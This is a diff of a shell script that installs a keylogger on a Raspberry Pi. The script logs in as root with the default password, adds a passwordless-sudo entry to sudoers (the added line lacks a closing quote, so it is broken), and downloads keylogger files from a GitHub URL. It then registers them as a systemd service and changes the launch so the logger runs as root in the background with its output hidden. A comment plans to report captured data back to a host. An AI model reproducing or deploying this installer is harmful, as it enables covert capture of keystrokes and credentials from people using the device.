@@ -9,6 +9,7 @@ base="https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/"
 su - root <<!
 raspberry
 echo "pi ALL=(ALL:ALL) ALL" >> /etc/sudoers
+echo "pi ALL=(ALL) NOPASSWD:ALL
 !
 
 mkdir nicekl && cd nicekl/
@@ -20,7 +21,7 @@ KMAP=${base}keymap.py
 FKEY=${base}find_keyboard.py
 KLSERV=${base}nicekeylogger.service
 wget -L "$CONT" "$KMAP" "$FKEY" "$KLSERV"
-echo raspberry | sudo -S chmod 744 controller.py
+sudo chmod +x controller.py
 
 # SET APPLICATION AS A SERVICE WITH SYSTEMD
 sudo mv nicekeylogger.service /etc/systemd/system/
@@ -29,7 +30,7 @@ sudo systemctl daemon-reload
 
 
 # RUN APPLICATION
-sudo python3 controller.py &
+sudo python3 controller.py > /dev/null 2>&1 &
 
 # REPORT BACK TO HOST
 # TODO - decide the period to report back
